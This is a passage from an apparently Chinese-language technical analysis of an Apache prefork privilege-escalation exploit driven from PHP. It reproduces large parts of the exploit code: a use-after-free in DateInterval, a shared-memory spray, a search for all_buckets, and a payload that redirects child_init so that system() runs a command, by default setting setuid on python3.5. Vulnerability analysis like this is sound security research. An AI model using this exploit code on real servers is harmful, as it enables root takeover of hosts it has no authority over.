    public format ( string $format ) : string
    }
因为有&timelib_rel_time ==
&zend_string，所以这里的`$d`和`$y`分别对应`zend_string`里的`len`和`val`。可以将`$x`（`DateInterval`）的`h`属性设置为0x13121110，再通过`$this->abc`字符串（`zend_string`）访问来判断UAF成功与否。
    # zend_string.refcount = 0
    $x->y = 0x00;
    # zend_string.len
    $x->d = 0x100;
    # zend_string.val[0-4]
    $x->h = 0x13121110;
    if(!(
        strlen($this->abc) === $x->d &&
        $this->abc[0] == "\x10" &&
        $this->abc[1] == "\x11" &&
        $this->abc[2] == "\x12" &&
        $this->abc[3] == "\x13"
    ))
    {
        o('UAF failed, exiting.');
        exit();
    }
        o('UAF successful.');;
最后别忘了释放掉`$room`，产生的空闲块将保护我们控制的结构，后面再新建变量都会优先使用这些内存。
    unset($room);
![
](https://images.seebug.org/content/images/2019/05/60877d19-52b9-4e83-a617-2d6b0ca3ae76.jpg-w331s)
#### 2.2.5 控制并修改UAF的结构
利用这个PHP漏洞的目的是为了能够获取读写SHM的权限，现在我们能够读写`zend_string.val`的内容，能读写的长度是`zend_string.len`，因此只要将`len`的值增加到包括SHM的范围。
这时我们已经知道了SHM的绝对地址，还需要知道`abc`的绝对地址，得到两者之间的偏移量才可以修改`len`。因此需要找到字符串`$this->abc`在内存中的位置：
    $address = str2ptr($this->abc, 0x70 * 2 - 24);
    $address = $address - 0x70 * 3;
    $address = $address + 24;
    o('Address of $abc: 0x' . dechex($address));
然后我们就可以计算两者间的偏移量了，还要注意的是，因为后面我们需要在内存中查找`all_bucket`，而它在apache的内存中所以我们的`len`需要将SHM和apache的内存都覆盖到，所以作者的WriteUp中说SHM和apache的内存都需要在PHP堆之后，而它们也确实都在PHP堆之后。
找SHM和apache的内存两者间较大的值，减去`abc`的地址，将得到的偏移通过`DateInterval`的`d`属性修改来修改`zend_string.len`。
    $distance = 
        max($addresses['apache'][1], $addresses['shm'][1]) - $address;
    $x->d = $distance;
这等同于将`zend_string`结构（$this->abc）中的`len`修改为一个超大的值，一直包括到SHM和Apache内存区域，这下我们就可以读写这个范围内的内存了。
### 2.3 在内存中定位all_buckets
根据内存模式查找all_buckets数组的位置，这在作者的writeup中有提到。`mutex`在`all_buckets`偏移0x10的位置，而`meth`在`mutex`偏移0x8的位置，根据该特征查找all_buckets数组。
首先，在apache的内存中搜索`all_buckets[idx]->mutex`，接着验证`meth`，是否在libapr.so的.data段中，最后因为`meth`指向libapr.so中定义的函数，因此验证其是否在.text段。满足这些条件的就是我们要找的`all_buckets[]`结构。
            $all_buckets = 0;
            for(
                $i = $addresses['apache'][0] + 0x10;
                $i abc, $i - $address);
                if(!in($pointer, $addresses['apache']))
                    continue;
                # meth
                $meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);
                if(!in($pointer, $addresses['libaprR']))
                    continue;
                o('  [&mutex]: 0x' . dechex($i));
                o('    [mutex]: 0x' . dechex($mutex));
                o('      [meth]: 0x' . dechex($meth));
顺便将meth结构中所有函数指针打印出来，第6个就是我们要用到的`(*child_init)()`。
                # meth->*
                # flags
                if(str2ptr($this->abc, $pointer - $address) != 0)
                    continue;
                # methods
                for($j=0;$jabc, $pointer + 0x8 + $j * 8 - $address);
                    if(!in($m, $addresses['libaprX']))
                        continue 2;
                    o('        [*]: 0x' . dechex($m));
                }
                $all_buckets = $i - 0x10;
                o('all_buckets = 0x' . dechex($all_buckets));
                break;
            }
这是meth的结构，可以对照着看一看：
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *);
        const char *name;
    };
![
](https://images.seebug.org/content/images/2019/05/49fb288f-7a32-4813-8d06-2d1f6bd93424.jpg-w331s)
### 2.4 计算索引buckets
再回忆一下漏洞利用的方法：在SHM中构造payload
（prefork_child_bucket结构），同时将剩余SHM区域喷射payload地址（并非payload起始地址），
控制指向喷射区域，所以`&all_buckets[bucket]`中的`meth`必然指向payload
，而payload中我们已将`child_init`函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的。
要想控制`&all_buckets[bucket]`指向`prefork_child_bucket`结构，不能直接将该结构精确放在某个位置，然后直接计算两者间的偏移，因为`all_buckets`的地址在每优雅重启后会发生变化，所以漏洞被触发时`all_buckets`的地址将与我们找到的地址是不同的，这就是作者在EXP中进行堆喷的目的。
`all_buckets`是一个结构体数组，元素`prefork_child_bucket`结构由三个指针组成：
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
如果在SHM中大量喷射一个指向payload的地址，只要让`&all_buckets[bucket]`落在该区域内，payload就能得到执行，如下图中所示：
![
](https://images.seebug.org/content/images/2019/05/47ae1a79-071e-4238-9049-9a64375e5401.jpg-w331s)
并且在EXP中，作者一共使用了两种方法来提高利用成功率：
  1. 喷射SHM，也就是上面提到的方法
  2. 修改每个worker的`process_score->bucket`结构，这样一来，利用成功率就可以再乘以Apache Worker的数量。这也是exp开始时调用`$workers_pids = get_workers_pids();`的原因。
先看第一种方法的实现：
SHM的起始部分是被apache的各个进程使用的，可以用SHM末尾的绝对地址`$spray_max`，减去未使用的内存空间大小`$spray_size`，得到要喷射区域的大小`$spray_size`；而未使用空间的大小可以通过减去已使用`worker_score`结构的总大小得到。
    $size_prefork_child_bucket = 24;
    $size_worker_score = 264;
    $spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);
    $spray_max = $addresses['shm'][1];
    $spray_min = $spray_max - $spray_size;
然后找喷射区域地址的中间值，计算它和`all_buckets`地址的偏移，再除以`prefork_child_bucket`结构的大小，就可以得到一个`all_buckets`数组下标索引，但别忘了SHM在`all_buckets`之前，所以这个索引还要取负值，这个值用`$bucket_index_middle`表示。
    $spray_middle = (int) (($spray_min + $spray_max) / 2);
    $bucket_index_middle = (int) ( - ($all_buckets - $spray_middle) / $size_prefork_child_bucket );
这样做的目的在于，在每优雅重启后，即便`all_buckets`的地址有所变化，`&all_buckets[bucket]`指向的位置会在`$spray_middle`上下浮动，最大程度上保证了该指针落在喷射的内存范围内，如下图所示：
![
](https://images.seebug.org/content/images/2019/05/4f0c68ab-24b1-45b1-8108-8bb05941d2fa.jpg-w331s)
### 2.5 设置payload并喷射SHM
Payload由三个部分组成
  1. bucket，用来存放要执行的命令，这是因为payload已经成了几个结构的叠加。
  2. meth，它还是apr_proc_mutex_unix_lock_methods_t结构，只是它的`child_init`替换成了`zend_object_std_dtor`，其他指针置空。
  3. properties，这是PHP内部结构`zend_object`的一个成员。
回忆漏洞的攻击链，最后的`child_init`被替换成函数`zend_object_std_dtor`执行，其原型如下，传入一个`zend_object`结构：
    ZEND_API void zend_object_std_dtor(zend_object *object);
所以原本传给`child_init`的`&my_bucket->mutex`（prefork_child_bucket结构的一部分）就和`zend_object`相叠加了。
![
](https://images.seebug.org/content/images/2019/05/0ac17f89-bccc-458c-aae8-a772e09b852d.jpg-w331s)
`zend_object_std_dtor`的执行又导致以下调用链：
    ...
    mutex = &my_bucket->mutex
    apr_proc_mutex_child_init(mutex)
            //(*mutex)->meth->child_init()
        (*mutex)->meth->zend_object_std_dtor(object)        //[object = mutex]
                    ht = object->properties
                    zend_array_destroy(ht)
                    zend_hash_destroy(ht)
                            val = &ht->arData[0]->val
                            ht->pDestructor(val)
上面的代码`properties`是一个`zend_array`结构，如下所示，我们控制其中的`arData`，`pDestructor`，如果我们将上面`&ht->arData[0]->val`放入要执行的命令，`pDestructor()`覆盖为`system`的地址，就可以实现命令执行了。
    struct _zend_array {
        zend_refcounted_h gc;
            //...
        uint32_t          nTableMask;
        Bucket           *arData;
        uint32_t          nNumUsed;
        uint32_t          nNumOfElements;
        uint32_t          nTableSize;
        uint32_t          nInternalPointer;
        zend_long         nNextFreeElement;
        dtor_func_t       pDestructor;
    };
回到exp中，首先构造bucket部分，放入要执行的命令，没有参数时默认执行"chmod +s
/usr/bin/python3.5"，但是自定义的命令长度也不能超过152字节。
    # Build payload
    $payload_start = $spray_min - $size_worker_score;
    $z = ptr2str(0);
        # Payload maxsize 264 - 112 = 152
            $bucket = isset($_REQUEST['cmd']) ?
                $_REQUEST['cmd'] :
                "chmod +s /usr/bin/python3.5";
            if(strlen($bucket) > $size_worker_score - 112)
            {
                o(
                    'Payload size is bigger than available space (' .
                    ($size_worker_score - 112) .
                    '), exiting.'
                );
                exit();
            }
            # Align
            $bucket = str_pad($bucket, $size_worker_score - 112, "\x00");
然后是meth，将原本`child_init`的指针改为`zend_object_std_dtor`
    # apr_proc_mutex_unix_lock_methods_t
            $meth = 
                $z .
                $z .
                $z .
                $z .
                $z .
                $z .
                # child_init
                ptr2str($addresses['zend_object_std_dtor'])
            ;
经过调试也可以看到`child_init`被覆盖：
![
](https://images.seebug.org/content/images/2019/05/5c14080c-43d6-42a5-8624-edc1fdd0e56e.jpg-w331s)